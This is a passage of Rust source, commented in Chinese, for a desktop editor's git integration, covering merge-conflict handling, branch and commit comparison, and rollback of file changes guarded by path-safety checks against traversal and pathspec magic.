/// git_merge_file_content / git_use_merge_side 里各有一份内联实现（能跑不动它），
/// 新命令走这里：单次 ls-files -u -z（-z 防空格路径被空白切分）。
fn unmerged_stages(dir: &str, rel: &str) -> Result<std::collections::HashSet<String>, String> {
    let ls = git_output(
        git_cmd()
            .arg("-C")
            .arg(dir)
            .args(["ls-files", "-u", "-z", "--", rel]),
    )
    .map_err(|e| format!("git ls-files failed: {}", e))?;
    if !ls.status.success() {
        return Err(String::from_utf8_lossy(&ls.stderr).trim().to_string());
    }
    let mut stages = std::collections::HashSet::new();
    for record in String::from_utf8_lossy(&ls.stdout).split('\0') {
        // "<mode> <hash> <stage>\t<path>"：stage 在 info 段的第三段
        let info = record.split('\t').next().unwrap_or("");
        let stage = info.split_whitespace().nth(2).unwrap_or("");
        if !stage.is_empty() {
            stages.insert(stage.to_string());
        }
    }
    Ok(stages)
}

/// stage 集合 → 冲突种类（与 git_merge_file_content 的 kind 口径一致）：
/// 2+3 都在=正文冲突；缺 2=我删对改；缺 3=对删我改；空=已解决。
fn conflict_kind_of(stages: &std::collections::HashSet<String>) -> &'static str {
    let has_ours = stages.contains("2");
    let has_theirs = stages.contains("3");
    if has_ours && has_theirs {
        "content"
    } else if has_ours {
        "deleted_by_them"
    } else if has_theirs {
        "deleted_by_us"
    } else {
        "resolved"
    }
}

/// 批量取冲突种类：Conflicts 对话框一次点亮所有行的 Yours/Theirs 列，
/// 不必逐文件调 git_merge_file_content（N 个文件 = 1 次 ls-files + 内存分组）。
#[tauri::command]
pub fn git_conflict_kinds(
    repo_path: Option<String>,
) -> Result<std::collections::HashMap<String, String>, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let ls = git_output(git_cmd().arg("-C").arg(&dir).args(["ls-files", "-u", "-z"]))
        .map_err(|e| format!("git ls-files failed: {}", e))?;
    if !ls.status.success() {
        return Err(String::from_utf8_lossy(&ls.stderr).trim().to_string());
    }
    let mut by_path: std::collections::HashMap<String, std::collections::HashSet<String>> =
        std::collections::HashMap::new();
    for record in String::from_utf8_lossy(&ls.stdout).split('\0') {
        let mut parts = record.splitn(2, '\t');
        let info = parts.next().unwrap_or("");
        let path = parts.next().unwrap_or("").to_string();
        if path.is_empty() {
            continue;
        }
        let stage = info.split_whitespace().nth(2).unwrap_or("");
        if stage.is_empty() {
            continue;
        }
        by_path.entry(path).or_default().insert(stage.to_string());
    }
    Ok(by_path
        .into_iter()
        .map(|(p, s)| (p, conflict_kind_of(&s).to_string()))
        .collect())
}

/// 三路合并工具的数据源：对 stage blob 跑 `git merge-file -p --diff3`，
/// 输出"已自动合好非冲突部分、冲突处留标记"的全文，前端按标记切块渲染。
/// 注意不读工作区文件：stage 2/3 是干净的双方原始内容，不会有标记串扰。
/// 删改冲突缺的一边按空文件合（对齐 PyCharm：Deleted|Modified 行也能点
/// Merge…，一边空一边是修改内容，逐块取空=删、取内容=留）。
#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct MergeMarkedDto {
    pub path: String,
    /// merge-file --diff3 -p 的输出（含 <<<<<<< / ||||||| / ======= / >>>>>>> 块）
    pub merged: String,
}

/// 单边大小上限：merge-file 要落三份临时文件，超大文件走整文件 Accept 即可，
/// 不开逐块工具（与 diff 的 PAGED_VIEW_THRESHOLD 同一量级取 1MB）。
const MERGE_MARKED_MAX_BYTES: u64 = 1024 * 1024;

#[tauri::command]
pub async fn git_merge_file_marked(
    repo_path: Option<String>,
    path: String,
) -> Result<MergeMarkedDto, String> {
    tauri::async_runtime::spawn_blocking(move || {
        let dir = repo_path.unwrap_or_else(|| ".".to_string());
        let rel = to_repo_relative(&dir, path.trim())?;
        ensure_safe_git_path(&rel)?;
        let stages = unmerged_stages(&dir, &rel)?;
        // 缺 stage（删改冲突）不拒绝：缺失边按空文件合，前端逐块决定留/删。
        // 全块取空边时前端走 git_use_merge_side 确认删除（而不是暂存空文件）。
        let blob_size = |stage: &str| -> Result<u64, String> {
            let out = git_output(git_cmd().arg("-C").arg(&dir).args([
                "cat-file",
                "-s",
                &format!(":{stage}:{rel}"),
            ]))
            .map_err(|e| format!("git cat-file failed: {}", e))?;
            if !out.status.success() {
                return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
            }
            String::from_utf8_lossy(&out.stdout)
                .trim()
                .parse::<u64>()
                .map_err(|e| format!("bad blob size: {e}"))
        };
        for stage in ["1", "2", "3"] {
            // 缺失的 stage（无 base 的双方新增、删改冲突被删的一边）按空文件合
            if !stages.contains(stage) {
                continue;
            }
            if blob_size(stage)? > MERGE_MARKED_MAX_BYTES {
                return Err(crate::error_proto::coded("merge_too_large", &rel));
            }
        }
        let show = |stage: &str| -> Result<String, String> {
            if !stages.contains(stage) {
                return Ok(String::new());
            }
            let out = git_output(
                git_cmd()
                    .arg("-C")
                    .arg(&dir)
                    .args(["show", &format!(":{stage}:{rel}")]),
            )
            .map_err(|e| format!("git show failed: {}", e))?;
            if !out.status.success() {
                return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
            }
            Ok(String::from_utf8_lossy(&out.stdout).to_string())
        };
        let tmp = create_private_temp_dir("lazecode-merge")?;
        // 命名固定，Parser 按 -L 标签认标记，不依赖文件名。
        let base_p = tmp.join("base");
        let ours_p = tmp.join("ours");
        let theirs_p = tmp.join("theirs");
        let write_tmp =
            |p: &Path, s: &str| fs::write(p, s).map_err(|e| format!("tmp write failed: {e}"));
        let result = (|| -> Result<String, String> {
            write_tmp(&base_p, &show("1")?)?;
            write_tmp(&ours_p, &show("2")?)?;
            write_tmp(&theirs_p, &show("3")?)?;
            let out = git_output(
                git_cmd()
                    .arg("-C")
                    .arg(&dir)
                    .arg("merge-file")
                    .arg("-p")
                    .arg("--diff3")
                    .arg("-L")
                    .arg("ours")
                    .arg("-L")
                    .arg("base")
                    .arg("-L")
                    .arg("theirs")
                    .arg(&ours_p)
                    .arg(&base_p)
                    .arg(&theirs_p),
            )
            .map_err(|e| format!("git merge-file failed: {e}"))?;
            // exit 0=无冲突（理论上不会走到，这里是冲突文件），1=有冲突（正常），
            // >1 才是真失败。两种成功都输出合并文本。
            if out.status.code().unwrap_or(2) > 1 {
                return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
            }
            Ok(String::from_utf8_lossy(&out.stdout).to_string())
        })();
        let _ = fs::remove_dir_all(&tmp);
        Ok(MergeMarkedDto {
            path: rel,
            merged: result?,
        })
    })
    .await
    .map_err(|e| format!("git_merge_file_marked 任务失败: {e}"))?
}
/// 「与当前分支比较」：列出 ref 独有的提交与差异文件；
/// against_worktree=true 时改为「ref 与工作区比较」（Show Diff with Working Tree），只返回文件差异
#[tauri::command]
pub async fn git_compare_refs(
    repo_path: Option<String>,
    ref_name: String,
    against_worktree: Option<bool>,
) -> Result<CompareResultDto, String> {
    // 该命令要串行跑 log + diff 两个 git 子进程（各 5~15ms 冷启动），
    // 同步执行时全占在 ipc:// custom-protocol worker 上，排在它后面的
    // 快照/输入命令一起等。改为 async 后 spawn_blocking 丢到 blocking 池，
    // worker 立即释放。
    tauri::async_runtime::spawn_blocking(move || {
        git_compare_refs_impl(repo_path, ref_name, against_worktree)
    })
    .await
    .map_err(|e| format!("git_compare_refs 任务失败: {e}"))?
}

fn git_compare_refs_impl(
    repo_path: Option<String>,
    ref_name: String,
    against_worktree: Option<bool>,
) -> Result<CompareResultDto, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let ref_name = ref_name.trim().to_string();
    reject_option_like(&ref_name)?;

    if against_worktree.unwrap_or(false) {
        // numstat 与 name-status 必须分两次 spawn：git 同时给两个选项时
        // 只输出 name-status 视图（已实测验证），不存在一次调用拿两份的写法。
        let numstat = git_output(git_cmd().arg("-C").arg(&dir).args([
            "-c",
            "core.quotepath=false",
            "diff",
            "--no-renames",
            "--numstat",
            "--end-of-options",
            &ref_name,
        ]))
        .map_err(|e| format!("git diff failed: {}", e))?;
        let name_status = git_output(git_cmd().arg("-C").arg(&dir).args([
            "-c",
            "core.quotepath=false",
            "diff",
            "--no-renames",
            "--name-status",
            "--end-of-options",
            &ref_name,
        ]))
        .map_err(|e| format!("git diff failed: {}", e))?;

        let mut status_map: HashMap<String, String> = HashMap::new();
        if name_status.status.success() {
            for line in String::from_utf8_lossy(&name_status.stdout).lines() {
                if let Some((status, path)) = line.split_once('\t') {
                    status_map.insert(
                        decode_git_path(path),
                        status.trim().chars().next().unwrap_or('M').to_string(),
                    );
                }
            }
        }

        let mut files = Vec::new();
        if numstat.status.success() {
            for line in String::from_utf8_lossy(&numstat.stdout).lines() {
                let parts: Vec<&str> = line.split('\t').collect();
                if parts.len() < 3 {
                    continue;
                }
                let path = decode_git_path(parts[2]);
                files.push(CommitFileDto {
                    status: status_map
                        .get(&path)
                        .cloned()
                        .unwrap_or_else(|| "M".to_string()),
                    additions: parts[0].trim().parse().unwrap_or(0),
                    deletions: parts[1].trim().parse().unwrap_or(0),
                    path,
                });
            }
        }
        return Ok(CompareResultDto {
            commits: Vec::new(),
            files,
        });
    }

    // 文件差异：同 against_worktree 分支，两个视图分两次 spawn（git 不支持
    // 一次输出两份）。这两个 diff 之间无依赖，且各自独立于上面的 log，
    // 因此并发发起：三个子进程的冷启动重叠，总时长约等于最慢的一个
    // 而不是三者之和。
    let numstat_dir = dir.clone();
    let ns_dir = dir.clone();
    let log_dir = dir.clone();
    let numstat_ref = format!("HEAD...{}", ref_name);
    let ns_ref = format!("HEAD...{}", ref_name);
    let log_ref = ref_name.clone();

    let numstat_out = tauri::async_runtime::spawn_blocking(move || {
        git_output(git_cmd().arg("-C").arg(&numstat_dir).args([
            "-c",
            "core.quotepath=false",
            "diff",
            "--no-renames",
            "--numstat",
            "--end-of-options",
            &numstat_ref,
        ]))
    });
    let name_status_out = tauri::async_runtime::spawn_blocking(move || {
        git_output(git_cmd().arg("-C").arg(&ns_dir).args([
            "-c",
            "core.quotepath=false",
            "diff",
            "--no-renames",
            "--name-status",
            "--end-of-options",
            &ns_ref,
        ]))
    });
    let log_out = tauri::async_runtime::spawn_blocking(move || {
        git_output(
            git_cmd()
                .arg("-C")
                .arg(&log_dir)
                .arg("log")
                .arg("-n")
                .arg("100")
                // --pretty 必须排在 --end-of-options 之前（见 git_log_impl 的说明）
                .arg("--pretty=format:%H%x09%h%x09%an%x09%ae%x09%ct%x09%s%x09%D%x09%P")
                .arg("--end-of-options")
                .arg(format!("HEAD..{}", log_ref)),
        )
    });
    // 三个 JoinHandle 的类型不同，无法放进数组统一 await，逐个 await 即可
    // （后两个的 spawn 已先发出，阻塞只是等最慢的一个）。

    let (numstat, name_status, log) = tauri::async_runtime::block_on(async {
        let numstat = numstat_out
            .await
            .map_err(|e| format!("git diff failed: {e}"))?
            .map_err(|e| format!("git diff failed: {e}"))?;
        let name_status = name_status_out
            .await
            .map_err(|e| format!("git diff failed: {e}"))?
            .map_err(|e| format!("git diff failed: {e}"))?;
        let log = log_out
            .await
            .map_err(|e| format!("git log failed: {e}"))?
            .map_err(|e| format!("git log failed: {e}"))?;
        Ok::<_, String>((numstat, name_status, log))
    })?;

    let commits = if log.status.success() {
        raw_log_to_dto_seeded(
            parse_git_log_output(&String::from_utf8_lossy(&log.stdout)),
            &[],
            0,
        )
    } else {
        Vec::new()
    };

    let mut status_map: HashMap<String, String> = HashMap::new();
    if name_status.status.success() {
        for line in String::from_utf8_lossy(&name_status.stdout).lines() {
            if let Some((status, path)) = line.split_once('\t') {
                status_map.insert(
                    decode_git_path(path),
                    status.trim().chars().next().unwrap_or('M').to_string(),
                );
            }
        }
    }

    let mut files = Vec::new();
    if numstat.status.success() {
        for line in String::from_utf8_lossy(&numstat.stdout).lines() {
            let parts: Vec<&str> = line.split('\t').collect();
            if parts.len() < 3 {
                continue;
            }
            let path = decode_git_path(parts[2]);
            files.push(CommitFileDto {
                status: status_map
                    .get(&path)
                    .cloned()
                    .unwrap_or_else(|| "M".to_string()),
                additions: parts[0].trim().parse().unwrap_or(0),
                deletions: parts[1].trim().parse().unwrap_or(0),
                path,
            });
        }
    }

    Ok(CompareResultDto { commits, files })
}

/// 对比任意两个提交的文件清单（Compare Versions / Changes Between A and B）
#[tauri::command]
pub async fn git_compare_commits(
    repo_path: Option<String>,
    from_commit: String,
    to_commit: String,
) -> Result<Vec<CommitFileDto>, String> {
    tauri::async_runtime::spawn_blocking(move || {
        git_compare_commits_impl(repo_path, from_commit, to_commit)
    })
    .await
    .map_err(|e| format!("git_compare_commits 任务失败: {e}"))?
}

fn git_compare_commits_impl(
    repo_path: Option<String>,
    from_commit: String,
    to_commit: String,
) -> Result<Vec<CommitFileDto>, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let from = from_commit.trim().to_string();
    let to = to_commit.trim().to_string();
    reject_option_like(&from)?;
    reject_option_like(&to)?;

    let numstat = git_output(git_cmd().arg("-C").arg(&dir).args([
        "-c",
        "core.quotepath=false",
        "diff",
        "--no-renames",
        "--numstat",
        "--end-of-options",
        &from,
        &to,
    ]))
    .map_err(|e| format!("git diff failed: {e}"))?;

    let name_status = git_output(git_cmd().arg("-C").arg(&dir).args([
        "-c",
        "core.quotepath=false",
        "diff",
        "--no-renames",
        "--name-status",
        "--end-of-options",
        &from,
        &to,
    ]))
    .map_err(|e| format!("git diff failed: {e}"))?;

    let mut status_map: HashMap<String, String> = HashMap::new();
    if name_status.status.success() {
        for line in String::from_utf8_lossy(&name_status.stdout).lines() {
            if let Some((status, path)) = line.split_once('\t') {
                status_map.insert(
                    decode_git_path(path),
                    status.trim().chars().next().unwrap_or('M').to_string(),
                );
            }
        }
    }

    let mut files = Vec::new();
    if numstat.status.success() {
        for line in String::from_utf8_lossy(&numstat.stdout).lines() {
            let parts: Vec<&str> = line.split('\t').collect();
            if parts.len() < 3 {
                continue;
            }
            let path = decode_git_path(parts[2]);
            files.push(CommitFileDto {
                status: status_map
                    .get(&path)
                    .cloned()
                    .unwrap_or_else(|| "M".to_string()),
                additions: parts[0].trim().parse().unwrap_or(0),
                deletions: parts[1].trim().parse().unwrap_or(0),
                path,
            });
        }
    }

    Ok(files)
}

/// Compare Branches 的一次性返回：两侧独有提交、两侧相对共同祖先的变更文件、
/// 共同祖先，以及是否因数量上限截断。
///
/// 注意这不是 Compare Versions：Compare Versions 只给两个提交之间的文件 diff；
/// 这里每条记录都是某一侧“存在、另一侧不存在”的提交，两侧各自独立成一条日志。
#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct CompareBranchesDto {
    pub left_commits: Vec<GitCommitDto>,
    pub right_commits: Vec<GitCommitDto>,
    pub left_files: Vec<CommitFileDto>,
    pub right_files: Vec<CommitFileDto>,
    pub merge_base: String,
    pub left_truncated: bool,
    pub right_truncated: bool,
}

/// Compare Branches：`left_ref` 中存在而 `right_ref` 中不存在的提交，反之亦然。
///
/// 语义是 PyCharm 的两条 `git log other..this` 日志，而不是 `git diff A B`
/// 的文件清单。`leftPath/rightPath` 仅影响各自日志的 path 过滤；两侧都通过
/// `git_log` 的既有实现，保留引用标签、父子关系与 DAG 所需字段。
#[tauri::command]
pub async fn git_compare_branches(
    repo_path: Option<String>,
    left_ref: String,
    right_ref: String,
    max_count: Option<u32>,
    left_path: Option<String>,
    right_path: Option<String>,
) -> Result<CompareBranchesDto, String> {
    tauri::async_runtime::spawn_blocking(move || {
        git_compare_branches_impl(
            repo_path, left_ref, right_ref, max_count, left_path, right_path,
        )
    })
    .await
    .map_err(|e| format!("git_compare_branches 任务失败: {e}"))?
}

fn git_compare_branches_impl(
    repo_path: Option<String>,
    left_ref: String,
    right_ref: String,
    max_count: Option<u32>,
    left_path: Option<String>,
    right_path: Option<String>,
) -> Result<CompareBranchesDto, String> {
    let dir = repo_path.clone().unwrap_or_else(|| ".".to_string());
    let left = left_ref.trim().to_string();
    let right = right_ref.trim().to_string();
    reject_option_like(&left)?;
    reject_option_like(&right)?;
    if left.is_empty() || right.is_empty() {
        return Err("分支比较需要两个非空引用".to_string());
    }

    // 上限只控制单侧日志条数；两侧文件清单仍按完整 branch-side diff 计算。
    // 多取一条用于判断是否还有更多提交，避免把“刚好等于上限”误报为完整。
    let limit = max_count.unwrap_or(1000).clamp(1, 10_000);
    let fetch_limit = limit.saturating_add(1);

    let left_range = format!("{}..{}", right, left);
    let right_range = format!("{}..{}", left, right);

    let mut left_commits = git_log_impl_filtered(
        Some(dir.clone()),
        Some(fetch_limit),
        None,
        None,
        Some(left_range),
        left_path,
        None,
        None,
        Some(true),
        None,
        None,
    )?;
    let mut right_commits = git_log_impl_filtered(
        Some(dir.clone()),
        Some(fetch_limit),
        None,
        None,
        Some(right_range),
        right_path,
        None,
        None,
        Some(true),
        None,
        None,
    )?;

    // Compare Branches 的日志不按 HEAD 置灰：另一条分支的独有提交本来就不在
    // 当前 HEAD 历史里，沿用 git_log 的灰底会把半屏内容都压暗。
    for c in left_commits.iter_mut().chain(right_commits.iter_mut()) {
        c.in_head = None;
    }

    let left_truncated = left_commits.len() > limit as usize;
    let right_truncated = right_commits.len() > limit as usize;
    left_commits.truncate(limit as usize);
    right_commits.truncate(limit as usize);

    // 共同祖先用于“全部提交”时打开文件 diff（merge-base..side）。
    // 无共同祖先（unrelated histories）是合法状态：留空，前端退化为两侧端点 diff。
    let merge_base = git_output(git_cmd().arg("-C").arg(&dir).args([
        "merge-base",
        "--end-of-options",
        &left,
        &right,
    ]))
    .ok()
    .filter(|o| o.status.success())
    .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
    .unwrap_or_default();

    // 文件清单失败不应连带让两条提交日志打不开；各自退化为空并在 Rust 日志留痕。
    let left_files = compare_branch_side_files(&dir, &left, &right).unwrap_or_else(|e| {
        log::warn!("Compare Branches 左侧文件清单失败: {e}");
        Vec::new()
    });
    let right_files = compare_branch_side_files(&dir, &right, &left).unwrap_or_else(|e| {
        log::warn!("Compare Branches 右侧文件清单失败: {e}");
        Vec::new()
    });

    Ok(CompareBranchesDto {
        left_commits,
        right_commits,
        left_files,
        right_files,
        merge_base,
        left_truncated,
        right_truncated,
    })
}

/// 某一侧相对共同祖先的变更文件：`git diff other...side`（三点 = merge-base..side）。
/// 与 `git_compare_commits` 的两次输出相同（numstat + name-status），但范围是
/// 三点语法，才能只统计这一侧独有的变更。
fn compare_branch_side_files(
    dir: &str,
    include: &str,
    exclude: &str,
) -> Result<Vec<CommitFileDto>, String> {
    let range = format!("{}...{}", exclude, include);

    let numstat = git_output(git_cmd().arg("-C").arg(dir).args([
        "-c",
        "core.quotepath=false",
        "diff",
        "--no-renames",
        "--numstat",
        "--end-of-options",
        &range,
    ]))
    .map_err(|e| format!("git diff failed: {e}"))?;
    if !numstat.status.success() {
        return Err(String::from_utf8_lossy(&numstat.stderr).trim().to_string());
    }

    let name_status = git_output(git_cmd().arg("-C").arg(dir).args([
        "-c",
        "core.quotepath=false",
        "diff",
        "--no-renames",
        "--name-status",
        "--end-of-options",
        &range,
    ]))
    .map_err(|e| format!("git diff failed: {e}"))?;

    let mut status_map: HashMap<String, String> = HashMap::new();
    if name_status.status.success() {
        for line in String::from_utf8_lossy(&name_status.stdout).lines() {
            if let Some((status, path)) = line.split_once('\t') {
                status_map.insert(
                    decode_git_path(path),
                    status.trim().chars().next().unwrap_or('M').to_string(),
                );
            }
        }
    }

    let mut files = Vec::new();
    for line in String::from_utf8_lossy(&numstat.stdout).lines() {
        let parts: Vec<&str> = line.split('\t').collect();
        if parts.len() < 3 {
            continue;
        }
        let path = decode_git_path(parts[2]);
        files.push(CommitFileDto {
            status: status_map
                .get(&path)
                .cloned()
                .unwrap_or_else(|| "M".to_string()),
            additions: parts[0].trim().parse().unwrap_or(0),
            deletions: parts[1].trim().parse().unwrap_or(0),
            path,
        });
    }
    Ok(files)
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct GitRepoInfoDto {
    pub is_repo: bool,
    /// 仓库根目录；非仓库时为空
    pub root: String,
    /// 当前分支名；空仓库（无提交）也返回分支名
    pub branch: String,
}

/// 识别目标目录是否为 git 工作区，返回仓库根与当前分支。
/// 非仓库时 is_repo=false，前端用于提示并提供 git init 入口。
#[tauri::command]
pub async fn git_repo_info(repo_path: Option<String>) -> Result<GitRepoInfoDto, String> {
    // 每次 refreshGit 的第一站，且自身要串行跑两个 git 子进程
    // （rev-parse + branch --show-current）。同步执行时这三段
    // （repo_info × 2 + 后续三个并行命令）全在同一条 ipc worker 上，
    // 面板刷新等于 4 个进程时长之和。见 git_status 的说明。
    tauri::async_runtime::spawn_blocking(move || {
        let dir = repo_path.unwrap_or_else(|| ".".to_string());
        let mut info = GitRepoInfoDto {
            is_repo: false,
            root: String::new(),
            branch: String::new(),
        };

        let top = git_output(git_cmd().arg("-C").arg(&dir).args([
            "rev-parse",
            "--is-inside-work-tree",
            "--show-toplevel",
        ]));
        // rev-parse 失败（超时 / 权限 / 路径不存在）与「不是仓库」是两件事：
        // 前者必须上抛，否则 refreshGit 会把 gitRepoInfo 当成 is_repo=false，
        // Git 面板显示「不是 git 仓库，点此 init」—— 在一个真仓库上提示初始化。
        let top = match top {
            Ok(o) if o.status.success() => o,
            Ok(_) => return Ok(info), // 正常退出但非仓库
            Err(e) => return Err(e),
        };
        let text = String::from_utf8_lossy(&top.stdout);
        let mut lines = text.lines();
        if lines.next().unwrap_or("false").trim() != "true" {
            return Ok(info);
        }
        info.root = lines.next().unwrap_or("").trim().to_string();

        // branch --show-current 在空仓库（无任何提交）下也能给出分支名
        if let Ok(o) = git_output(
            git_cmd()
                .arg("-C")
                .arg(&dir)
                .args(["branch", "--show-current"]),
        ) {
            if o.status.success() {
                info.branch = String::from_utf8_lossy(&o.stdout).trim().to_string();
            }
        }
        info.is_repo = true;
        Ok(info)
    })
    .await
    // 任务 join 失败（blocking 池故障）同样上抛，不伪装成「不是仓库」
    .map_err(|e| format!("git_repo_info 任务失败: {e}"))?
}

/// 在目标目录初始化一个新的 git 仓库
#[tauri::command]
pub fn git_init(repo_path: Option<String>) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let output = git_output(git_cmd().arg("-C").arg(&dir).arg("init"))
        .map_err(|e| format!("git init failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// 手动回滚某次提交：生成一个反向提交（等价 PyCharm 的 Revert Commit）
#[tauri::command]
pub fn git_revert_commit(repo_path: Option<String>, hash: String) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    reject_option_like(&hash)?;
    let output = git_output_local(git_cmd().arg("-C").arg(&dir).args([
        "revert",
        "--no-edit",
        "--end-of-options",
        &hash,
    ]))
    .map_err(|e| format!("revert failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// 将任意形态的路径规范化为仓库相对路径。
/// 绝对路径必须转换：`HEAD:{path}` 等 rev 语法只接受仓库相对路径，
/// 直接拼绝对路径会判定失败并误入破坏性分支（如把修改当新增执行 git rm）。
///
/// strip_prefix 失败（路径在仓库外）时返回错误而非原样回传绝对路径：
/// `Path::join` 遇到绝对路径会整体替换基准目录，后续 `git rm` /
/// `git clean -fd` 会把破坏范围指到工作区之外。
fn to_repo_relative(dir: &str, path: &str) -> Result<String, String> {
    let p = Path::new(path);
    if !p.is_absolute() {
        return Ok(path.replace('\\', "/"));
    }
    let dir_p = Path::new(dir);
    // canonicalize 处理符号链接（macOS /tmp → /private/tmp 等）；文件已被删除时回退到词法匹配
    let dir_canon = fs::canonicalize(dir_p).unwrap_or_else(|_| dir_p.to_path_buf());
    let abs_canon = fs::canonicalize(p).unwrap_or_else(|_| p.to_path_buf());
    match abs_canon.strip_prefix(&dir_canon) {
        Ok(rel) => {
            let s = rel.to_string_lossy().replace('\\', "/");
            Ok(if s.is_empty() { ".".to_string() } else { s })
        }
        Err(_) => Err(crate::error_proto::coded(
            "path_outside_repo",
            format!("{dir} / {path}"),
        )),
    }
}

/// git 破坏性操作前的路径安全闸：只放行非绝对、不含 `..` 段、
/// 不含 `.git` 段的仓库相对路径。
///
/// `Path::join` 遇绝对路径会整体替换基准目录、`git clean -fd -- ../x`
/// 会把清理范围指到工作区之外 —— 都可能删掉仓库外的文件，宁可报错。
/// `.git` 段：项目树已过滤 `.git`、git status 永不产出 `.git/...`，
/// 正常调用到不了这里；拦的是「未来某个调用方把内部路径透出来」的纵深。
/// 大小写不敏感（macOS/Windows 默认不敏感，git 自己也这么认）。
fn ensure_safe_git_path(git_path: &str) -> Result<(), String> {
    if Path::new(git_path).is_absolute() {
        return Err(crate::error_proto::coded(
            "absolute_path_rejected",
            git_path,
        ));
    }
    if git_path.split('/').any(|seg| seg == "..") {
        return Err(crate::error_proto::coded("dotdot_path_rejected", git_path));
    }
    if git_path
        .split('/')
        .any(|seg| seg.eq_ignore_ascii_case(".git"))
    {
        return Err(crate::error_proto::coded("dotgit_path_rejected", git_path));
    }
    // `--` 只终止选项解析，不终止 pathspec magic：仓库里可以存在名为
    // `:!important` 或 `:(glob)*` 的文件，选中它会把操作扩大到整棵树。
    // 破坏性入口宁可直接拒绝这类文件名，也不冒险按 magic 展开。
    if git_path.starts_with(':')
        || git_path.contains('*')
        || git_path.contains('?')
        || git_path.contains('[')
    {
        return Err(crate::error_proto::coded(
            "pathspec_magic_rejected",
            git_path,
        ));
    }
    Ok(())
}

/// 读冲突文件的工作区内容，但不允许顺着仓库里的软链读到仓库外。
/// 文件不存在（冲突一侧已删除、尚未创建）返回空串，保持合并工具的语义。
fn read_repo_worktree_text(dir: &str, git_path: &str) -> String {
    let root = match fs::canonicalize(dir) {
        Ok(p) => p,
        Err(_) => return String::new(),
    };
    let target = Path::new(dir).join(git_path);
    match fs::canonicalize(&target) {
        Ok(canonical) if canonical.starts_with(&root) => {
            fs::read_to_string(canonical).unwrap_or_default()
        }
        Ok(_) => {
            log::warn!("拒绝读取仓库外软链指向的冲突文件: {}", target.display());
            String::new()
        }
        Err(_) => String::new(),
    }
}

/// 回滚单个文件的未提交更改（工作区 + 暂存区）：
/// - HEAD 中存在该文件 → checkout HEAD 恢复
/// - HEAD 中不存在（新增/未跟踪）→ 从暂存区与磁盘删除
#[tauri::command]
pub fn git_discard_file_changes(repo_path: Option<String>, path: String) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    git_discard_file_changes_impl(&dir, &path, None)
}

/// `git_discard_file_changes` 的实现体。
///
/// `in_head_hint` 允许调用方（changelist 批量回滚）跳过逐文件的
/// `git cat-file -e HEAD:<path>` 探测：`Some(true/false)` 表示已由一次批量
/// 查询确定，`None` 表示未知、按原逻辑单文件探测。
fn git_discard_file_changes_impl(
    dir: &str,
    path: &str,
    in_head_hint: Option<bool>,
) -> Result<String, String> {
    // 路径规范化：兼容绝对路径（项目树右键）与仓库相对路径（提交抽屉）
    let git_path = to_repo_relative(dir, path)?;
    // 统一安全闸：下面的 git checkout / git rm / git clean -fd 与磁盘删除
    // 都拿 git_path 去 join，必须在入口处排除绝对路径与 `..` 段。
    ensure_safe_git_path(&git_path)?;

    // 目录回滚：恢复已跟踪修改 + 清理未跟踪文件（对齐 PyCharm 对目录的 Rollback）
    if Path::new(dir).join(&git_path).is_dir() {
        let checkout = git_output_local(git_cmd().arg("-C").arg(dir).args([
            "-c",
            "core.quotepath=false",
            "checkout",
            "HEAD",
            "--",
            &git_path,
        ]))
        .map_err(|e| format!("git 调用失败: {}", e))?;
        let clean = git_output_local(git_cmd().arg("-C").arg(dir).args([
            "-c",
            "core.quotepath=false",
            "clean",
            "-fd",
            "--",
            &git_path,
        ]))
        .map_err(|e| format!("git 调用失败: {}", e))?;
        if !checkout.status.success() && !clean.status.success() {
            return Err(String::from_utf8_lossy(&clean.stderr).to_string());
        }
        let cleaned = String::from_utf8_lossy(&clean.stdout).lines().count();
        if cleaned > 0 {
            return Ok(format!(
                "已回滚目录 {}（清理未跟踪 {} 项）",
                git_path, cleaned
            ));
        }
        return Ok(format!("已回滚目录 {}", git_path));
    }

    let in_head = match in_head_hint {
        Some(known) => known,
        None => {
            let head_ref = format!("HEAD:{}", git_path);
            git_output(
                git_cmd()
                    .arg("-C")
                    .arg(dir)
                    .args(["cat-file", "-e", &head_ref]),
            )
            .map_err(|e| format!("git 调用失败: {}", e))?
            .status
            .success()
        }
    };

    let output = if in_head {
        git_output_local(
            git_cmd()
                .arg("-C")
                .arg(dir)
                .args(["checkout", "HEAD", "--", &git_path]),
        )
        .map_err(|e| format!("checkout failed: {}", e))?
    } else {
        let rm = git_output_local(
            git_cmd()
                .arg("-C")
                .arg(dir)
                .args(["rm", "-f", "--", &git_path]),
        )
        .map_err(|e| format!("git rm failed: {}", e))?;
        if !rm.status.success() {
            // 完全未跟踪的文件：直接从磁盘删除
            let target = Path::new(dir).join(&git_path);
            fs::remove_file(&target).map_err(|e| format!("删除文件失败: {}", e))?;
            return Ok(format!("已删除未跟踪文件 {}", git_path));
        }
        rm
    };

    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// 批量判定 `paths` 中哪些存在于 HEAD（供 changelist 批量回滚复用）。
///
/// 一次 `git ls-tree` 取代逐文件 `git cat-file -e HEAD:<path>`：回滚一个
/// 含几十个文件的变更列表时省下几十次进程启动。
/// 返回 None 表示批量查询本身失败 —— 调用方必须回退到逐文件探测：
/// 把失败当成「都不在 HEAD」会让本该 checkout 还原的文件走 `git rm -f` 分支。
